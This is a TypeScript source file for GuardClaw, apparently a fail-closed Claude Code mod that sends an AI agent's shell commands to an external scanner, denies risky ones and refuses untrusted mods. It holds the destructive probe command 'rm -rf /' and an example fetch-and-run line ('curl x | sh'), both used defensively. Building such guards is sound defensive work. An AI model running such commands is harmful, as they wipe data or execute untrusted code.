// Copyright 2025-2026 TakeInterest Inc.
// SPDX-License-Identifier: Apache-2.0
//
// GuardClaw as a Claude Code mod: deny-only, fail-closed, and a thin adapter
// over the Go engine. Every shell command the model asks to run (Bash,
// Monitor, any tool with a string `command`, and an MCP tool's command, cmd,
// script or code argument) is piped on stdin to `guardclaw-scan
// --stdin-command --agent` through $.process.run, with no shell in between.
// Agent mode judges each simple command inside a line, so `cd src && npm
// test` runs and `cd /tmp && curl x | sh` does not. The mod
// runtime has no WebAssembly on purpose, so compiled code runs as a process
// of its own.
//
// What it uses on `$`: process.run (the scanner), fs.stat (where a written
// path really lands), env.get (HOME), plugin (its own folder), state (the
// day's deny count), clock (to know the day), ui.status and ui.log. It never
// approves a call, never writes a file and never reaches the network.

import type { EngineInterface, Register } from 'claude-code'
import {
  checkCommand,
  commandStringsOf,
  degradedVerdict,
  expandHome,
  DEFAULT_TRUSTED_MARKETPLACES,
  protectedWrite,
  riskyCallsOf,
  riskyEventsOf,
  trustedMarketplaceOf,
  WRITE_TOOLS,
  type Verdict,
} from './rules.ts'

export const INSTALL_LINE = 'go install github.com/TakeInterestInc/guardclaw-core/cmd/guardclaw-scan@latest'

/** How long one scan may take before that call is denied. */
const SCAN_TIMEOUT_MS = 10_000

/** The probe a working scanner must deny: proves the binary runs and has --stdin-command --agent. */
export const PROBE_COMMAND = 'rm -rf /'

type Mode = 'scanner' | 'degraded'

// Module variables: a hot reload starts them over, and the next call probes
// again. Everything that must survive a reload lives in $.state.
let modePromise: Promise<Mode> | undefined
let rootRealPromise: Promise<string | undefined> | undefined

function list(value: unknown): string[] {
  if (Array.isArray(value)) return value.filter((v): v is string => typeof v === 'string' && v.trim() !== '').map(v => v.trim())
  if (typeof value === 'string' && value.trim() !== '') return value.split(',').map(v => v.trim()).filter(Boolean)
  return []
}

async function today($: EngineInterface): Promise<string> {
  return new Date(await $.clock.now()).toISOString().slice(0, 10)
}

function statusText(count: number, mode: Mode | undefined): string {
  const counted = `GuardClaw: ${count} blocked today`
  if (mode !== 'degraded') return counted
  return `${counted} · scanner missing, only simple shell commands run. Install: ${INSTALL_LINE}`
}

async function currentCount($: EngineInterface): Promise<number> {
  const day = await today($)
  const { value } = await $.state.get({ plugin: 'guardclaw', key: 'blocked' })
  return value && value.day === day ? value.count : 0
}

async function knownMode(): Promise<Mode | undefined> {
  return modePromise ? modePromise.catch(() => 'degraded' as const) : undefined
}

async function redrawStatus($: EngineInterface): Promise<void> {
  try {
    $.ui.status(statusText(await currentCount($), await knownMode()))
  } catch {
    // A status line that fails to draw changes nothing about what is denied.
  }
}

/** Adds one to today's count and redraws the status line. Never throws: the deny stands either way. */
async function recordDeny($: EngineInterface): Promise<void> {
  try {
    const day = await today($)
    for (let attempt = 0; attempt < 3; attempt++) {
      const held = await $.state.get({ plugin: 'guardclaw', key: 'blocked' })
      const count = held.value && held.value.day === day ? held.value.count + 1 : 1
      const wrote = await $.state.set({ plugin: 'guardclaw', key: 'blocked' }, { day, count }, { ifVersion: held.version })
      if (wrote.isSet) {
        $.ui.status(statusText(count, await knownMode()))
        return
      }
    }
  } catch {
    // Counting is a courtesy; the deny itself has already been decided.
  }
}

function log($: EngineInterface, text: string, to: 'transcript' | 'debug'): void {
  try {
    $.ui.log(text, { to })
  } catch {
    // A log line that cannot be shown never changes a refusal.
  }
}

function denyText(v: Verdict): string {
  return `GuardClaw blocked this (${v.rule}): ${v.reason}. If it was intended, run it yourself outside the agent.`
}

type ScanLine = { decision?: unknown; rule?: unknown; reason?: unknown }

function parseScanLine(stdout: string): ScanLine | undefined {
  const line = stdout.trim().split('\n')[0] ?? ''
  try {
    const parsed: unknown = JSON.parse(line)
    return parsed !== null && typeof parsed === 'object' ? (parsed as ScanLine) : undefined
  } catch {
    return undefined
  }
}

function message(error: unknown): string {
  return error instanceof Error ? error.message : String(error)
}

/** Runs the probe once: `scanner` when guardclaw-scan starts and denies it, `degraded` otherwise. */
async function probe($: EngineInterface, scannerPath: string): Promise<Mode> {
  try {
    const r = await $.process.run([scannerPath, '--stdin-command', '--agent'], { stdin: PROBE_COMMAND, timeoutMs: SCAN_TIMEOUT_MS })
    const line = parseScanLine(r.stdout)
    if (r.exitCode === 1 && line?.decision === 'deny') return 'scanner'
    log($, `GuardClaw: ${scannerPath} did not deny the probe (exit ${r.exitCode}); running degraded. Install: ${INSTALL_LINE}`, 'transcript')
    return 'degraded'
  } catch (error) {
    log($, `GuardClaw: could not run ${scannerPath} (${message(error)}); running degraded. Install: ${INSTALL_LINE}`, 'transcript')
    return 'degraded'
  }
}

function modeOf($: EngineInterface, scannerPath: string): Promise<Mode> {
  if (!modePromise) {
    modePromise = probe($, scannerPath)
    void modePromise.then(mode => (mode === 'degraded' ? redrawStatus($) : undefined))
  }
  return modePromise
}

/**
 * One scan through the Go engine. Exit 1 is a deny with the engine's rule;
 * exit 0 with an `allow` line passes; anything else (exit 2, a crash, a
 * timeout, output that does not parse) denies this call only and leaves the
 * mode as it was, so the next call is scanned again.
 */
async function scan($: EngineInterface, scannerPath: string, command: string): Promise<Verdict | undefined> {
  let r
  try {
    r = await $.process.run([scannerPath, '--stdin-command', '--agent'], { stdin: command, timeoutMs: SCAN_TIMEOUT_MS })
  } catch (error) {
    return { rule: 'scanner_error', reason: `the GuardClaw scanner did not finish (${message(error)}), so this call is denied; the next one is scanned again` }
  }
  const line = parseScanLine(r.stdout)
  if (r.exitCode === 0 && line?.decision === 'allow') return undefined
  if (r.exitCode === 1) {
    const rule = typeof line?.rule === 'string' && line.rule !== '' ? line.rule : 'scanner_deny'
    const reason = typeof line?.reason === 'string' && line.reason !== '' ? line.reason : 'the GuardClaw engine flagged this command'
    return { rule, reason }
  }
  const detail = r.stderr.trim().split('\n')[0] ?? ''
  return { rule: 'scanner_error', reason: `the GuardClaw scanner exited ${r.exitCode}${detail ? ` (${detail})` : ''}, so this call is denied` }
}

/** Where a path lands: the file if it stats, else its folder plus the name; undefined when neither resolves. */
async function placed($: EngineInterface, path: string): Promise<string | undefined> {
  const own = await $.fs.stat(path, { resolve: true }).catch(() => undefined)
  if (own?.realPath) return own.realPath
  const cut = path.lastIndexOf('/')
  const name = path.slice(cut + 1)
  if (name === '' || name === '.' || name === '..') return undefined
  const folder = cut < 0 ? '.' : path.slice(0, cut + 1)
  const dir = await $.fs.stat(folder, { resolve: true }).catch(() => undefined)
  return dir?.realPath === undefined ? undefined : `${dir.realPath.replace(/\/$/, '')}/${name}`
}

function rootReal($: EngineInterface): Promise<string | undefined> {
  if (!rootRealPromise) rootRealPromise = $.fs.stat($.plugin.root, { resolve: true }).then(s => s.realPath, () => undefined)
  return rootRealPromise
}

export const register: Register = (on, options) => {
  const allowMods = list(options.allowMods)
  const extraDenyPatterns = list(options.extraDenyPatterns)
  const trustedMarketplaces = options.trustedMarketplaces === undefined ? DEFAULT_TRUSTED_MARKETPLACES : list(options.trustedMarketplaces)
  const scannerPath = typeof options.scannerPath === 'string' && options.scannerPath.trim() !== '' ? options.scannerPath.trim() : 'guardclaw-scan'

  on('session.start', async ($, e, next) => {
    const result = await next(e)
    try {
      await modeOf($, scannerPath)
    } catch {
      // probe() never rejects; a failure here only means the status waits.
    }
    await redrawStatus($)
    return result
  })

  on('tool.call', async ($, e, next) => {
    let verdict: Verdict | undefined
    try {
      const input = e as unknown as Record<string, unknown>
      const home = await $.env.get('HOME').catch(() => undefined)
      if (e.tool in WRITE_TOOLS) {
        const field = WRITE_TOOLS[e.tool] ?? 'file_path'
        const path = input[field]
        if (typeof path !== 'string') throw new TypeError(`${e.tool} ${field} is ${typeof path}, not a string`)
        const real = await placed($, expandHome(path, home))
        verdict = protectedWrite(path, [$.plugin.root, (await rootReal($)) ?? ''], home, real)
      }
      if (!verdict && e.tool === 'Bash' && typeof input.command !== 'string') {
        throw new TypeError(`Bash command is ${typeof input.command}, not a string`)
      }
      for (const command of verdict ? [] : commandStringsOf(input)) {
        const mode = await modeOf($, scannerPath)
        verdict = mode === 'degraded'
          ? degradedVerdict(command, $.plugin.root, extraDenyPatterns, home)
          : checkCommand(command, $.plugin.root, extraDenyPatterns, home) ?? (await scan($, scannerPath, command))
        if (verdict) break
      }
    } catch (error) {
      // Fail closed: a matcher that cannot decide denies.
      verdict = { rule: 'matcher_error', reason: `the GuardClaw matcher failed (${message(error)}), so the call is denied rather than let through` }
    }
    if (verdict) {
      await recordDeny($)
      return { deny: denyText(verdict) }
    }
    return next(e)
  }).catch(($, e, next) => {
    // The hook threw past its own try or overran its budget: deny, never pass.
    const why = next.error.kind === 'timeout' ? 'it ran out of time' : `it threw: ${next.error.message ?? 'no message'}`
    return { deny: `GuardClaw blocked this (hook_failure): the guard could not finish checking the call (${why}), so it is denied.` }
  })

  // Admission: a later user or append mod that could approve a tool call,
  // answer one of the guard's own calls, run host commands, write files,
  // change settings or reach the network is refused unless its exact
  // name@marketplace is in allowMods or it comes from a trusted marketplace
  // (by default `builtin` and Anthropic's `claude-plugins-official`). Prepend (managed) and built-in mods are
  // an administrator's and the binary's, not checked here.
  on('plugin.register', ($, e, next) => {
    if (e.root === $.plugin.root) return next(e)
    if (e.tier !== 'user' && e.tier !== 'append') return next(e)
    const events = riskyEventsOf(e.uses.events)
    const calls = riskyCallsOf(e.uses.calls)
    const envWrites = e.uses.env?.writes ?? []
    if (events.length === 0 && calls.length === 0 && envWrites.length === 0) return next(e)
    const parts = [
      events.length > 0 ? `it hooks ${events.join(', ')}` : '',
      calls.length > 0 ? `it calls ${calls.join(', ')}` : '',
      envWrites.length > 0 ? `it sets ${envWrites.join(', ')}` : '',
    ].filter(Boolean).join('; ')
    const isAllowlisted = allowMods.includes(e.provenance) && !e.provenance.endsWith('@inline')
    if (isAllowlisted) {
      log($, `GuardClaw: allowed mod ${e.provenance} (${parts}) because it is in allowMods`, 'debug')
      return next(e)
    }
    const marketplace = trustedMarketplaceOf(e.provenance, trustedMarketplaces)
    if (marketplace !== undefined) {
      log($, `GuardClaw: allowed mod ${e.provenance} (${parts}) because ${marketplace} is a trusted marketplace`, 'debug')
      return next(e)
    }
    const reason = `GuardClaw refused mod ${e.provenance}: ${parts}, which can approve tool calls, answer the guard's own checks or act outside the session. Add "${e.provenance}" to the guardclaw allowMods option to load it.`
    log($, reason, 'transcript')
    return { refuse: reason }
  }).catch(($, e) => ({ refuse: `GuardClaw could not check mod ${e.provenance}, so it was refused (fail closed).` }))
}
